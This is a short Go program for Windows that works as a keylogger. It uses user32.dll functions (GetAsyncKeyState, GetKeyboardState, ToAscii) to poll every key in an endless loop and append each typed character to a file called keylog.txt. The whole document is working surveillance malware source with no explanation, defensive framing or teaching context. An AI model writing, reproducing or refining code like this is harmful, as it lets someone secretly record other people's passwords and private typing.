package main

import (
	"os"
	"syscall"
	"time"
	"unsafe"
)

var (
	user32               = syscall.NewLazyDLL("user32.dll")
	procGetAsyncKeyState = user32.NewProc("GetAsyncKeyState")
	procToAscii          = user32.NewProc("ToAscii")
	procGetKeyboardState = user32.NewProc("GetKeyboardState")
)

func getAsyncKeyState(vKey int) bool {
	ret, _, _ := procGetAsyncKeyState.Call(uintptr(vKey))
	return ret&0x8000 != 0
}

func getCharFromKey(vKey int) string {
	var keyboardState [256]byte
	procGetKeyboardState.Call(uintptr(unsafe.Pointer(&keyboardState)))
	var buffer [2]uint16
	ret, _, _ := procToAscii.Call(uintptr(vKey), 0, uintptr(unsafe.Pointer(&keyboardState)), uintptr(unsafe.Pointer(&buffer)), 0)
	if ret > 0 {
		return string(rune(buffer[0]))
	}
	return ""
}

func keyLogger(outputFile string) {
	file, _ := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	defer file.Close()
	for {
		for key := 8; key <= 255; key++ {
			if getAsyncKeyState(key) {
				char := getCharFromKey(key)
				if char != "" {
					file.WriteString(char)
				}
				time.Sleep(10 * time.Millisecond)
			}
		}
	}
}

func main() {
	keyLogger("keylog.txt")
}
